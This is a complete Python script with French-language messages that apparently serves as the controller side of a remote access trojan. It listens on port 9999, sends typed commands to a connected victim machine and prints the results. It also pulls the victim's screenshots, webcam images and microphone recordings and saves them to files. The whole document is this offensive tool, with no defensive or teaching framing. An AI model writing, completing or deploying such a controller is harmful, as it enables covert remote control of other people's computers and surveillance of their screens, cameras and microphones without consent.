import socket

host = '0.0.0.0'
port = 9999

server = socket.socket()
server.bind((host, port))
server.listen(1)
print(f"[+] En attente de connexion sur {host}:{port}...")

conn, addr = server.accept()
print(f"[+] Connecté à {addr}")

while True:
    cmd = input("Commande : ")
    if cmd.lower() in ['exit', 'quit']:
        conn.send(cmd.encode())
        break

    conn.send(cmd.encode())

    if cmd.lower() in ["screenshot", "webcam", "mic"]:
        size = int(conn.recv(1024).decode())
        conn.send(b"ACK")
        data = b''
        while len(data) < size:
            packet = conn.recv(4096)
            if not packet:
                break
            data += packet

        filename = {
            "screenshot": "received_screenshot.png",
            "webcam": "received_webcam.jpg",
            "mic": "received_audio.wav"
        }[cmd.lower()]

        with open(filename, "wb") as f:
            f.write(data)

        print(f"[+] {filename} reçu.")
        continue

    output = conn.recv(4096).decode()
    print(output)

conn.close()

